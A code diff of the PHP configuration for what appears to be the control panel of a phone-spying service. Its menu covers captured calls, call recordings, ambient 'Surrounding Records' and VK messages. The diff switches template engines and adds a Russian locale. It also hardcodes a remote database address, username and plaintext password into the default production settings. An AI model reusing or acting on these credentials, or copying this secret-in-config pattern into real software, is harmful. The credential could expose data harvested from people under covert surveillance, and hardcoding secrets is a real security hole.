@@ -1,7 +1,7 @@
 <?php
 
 $default = array(
-    'build' => 25,
+    'build' => 27,
     'domain' => 'http://cp.topspyapp.com-test',
     'staticDomain' => 'http://cp.topspyapp.com-test/static',
     'cookieDomain' => '.topspyapp.com-test',
@@ -20,10 +20,10 @@ $default = array(
         )
     ),
     'db' => array(
-        'host' => 'localhost',
-        'username' => 'root',
-        'password' => '',
-        'dbname' => 'spy.user_data',
+        'host' => '66.232.96.3',
+        'username' => 'user_data',
+        'password' => 'pai1Geo9',
+        'dbname' => 'user_data',
         'options' => array(
             //PDO::MYSQL_ATTR_INIT_COMMAND => 'set names utf8;',
             PDO::MYSQL_ATTR_INIT_COMMAND => 'set names latin1;',
@@ -41,20 +41,17 @@ $default = array(
         'logoImageUrl' => 'http://www.topspyapp.com/wp-content/themes/topspyapp/images/logo.png',
         'logoUrl' => 'http://cp.topspyapp.com/'
     ),
-    'smarty' => array(
-        'template_dir' => ROOT_PATH . 'templates/',
-        'compile_dir' => ROOT_PATH . 'tmp/',
-        'caching' => false,
-        'compile_check' => true,
-        'force_compile' => true
+    'fenom' => array(
+        'templatesDir' => ROOT_PATH . 'templates/',
+        'compileDir' => ROOT_PATH . 'tmp/',
+        'options' => array(
+            'force_include' => true,
+            //'strip' => true
+        )
     ),
     'locales' => array(
         'en-GB' => 'English',
-        //'ru-RU' => 'Russian'
-    //'de-DE' => 'German',
-    //'es-ES' => 'Spanish',
-    //'it-IT' => 'Italian',
-    //'uk-UA' => 'Ukrainian'
+        'ru-RU' => 'Русский'
     ),
     'cpMenu' => array(
         'calls' => 'View Calls',
@@ -66,7 +63,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -76,7 +73,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -86,7 +83,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -96,7 +93,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -106,11 +103,11 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
-        'surrounding' =>  'Surrounding Records',
+        'surrounding' => 'Surrounding Records',
         'callRecordings' => array(
             'name' => 'Call Recordings',
             'show' => function($di) {
@@ -119,7 +116,7 @@ $default = array(
                 } elseif ($di['currentDevice']['os'] == 'ios') {
                     return preg_match('#^iphone 5#i', $di['currentDevice']['model']);
                 }
-                
+
                 return true;
             }
         ),
@@ -129,7 +126,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -139,7 +136,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -149,7 +146,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -159,7 +156,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -169,7 +166,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -179,20 +176,20 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
         'vk' => array(
             'name' => 'VK Messages',
             'show' => function($di) {
-//                if ($di['locale'] != 'ru-RU') {
-//                    return false;
-//                }
+                if ($di['locale'] != 'ru-RU') {
+                    return false;
+                }
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -202,7 +199,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -212,7 +209,7 @@ $default = array(
                 if ($di['currentDevice']['os'] == 'blackberry') {
                     return false;
                 }
-                
+
                 return true;
             }
         ),
@@ -224,7 +221,7 @@ $default = array(
                 } elseif ($di['currentDevice']['os'] == 'android') {
                     return compareOSVersion('android', '4.4', $di['currentDevice']['os_version'], '<');
                 }
-                
+
                 return true;
             }
         ),
@@ -252,22 +249,11 @@ $default = array(
 if (APPLICATION_ENV == 'production') {
     return $default;
 } else if (APPLICATION_ENV == 'development') {
-    return array_merge($default, array(
-        'domain' => 'http://new.cp',
-        'staticDomain' => 'http://new.cp/static',
-        'cookieDomain' => 'new.cp',
-        'db' => array(
-            'host' => 'localhost',
-            'username' => 'root',
-            'password' => '',
-            'dbname' => 'spy.user_data',
-            'options' => array(
-                PDO::MYSQL_ATTR_INIT_COMMAND => 'set names latin1;',
-                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
-            )
-        )
-    ));
+    if (file_exists(ROOT_PATH . 'development.config.php')) {
+        return require ROOT_PATH . 'development.config.php';
+    } else {
+        return $default;
+    }
 } else if (APPLICATION_ENV == 'testing') {
     return array_merge($default, array(
         'db' => array(
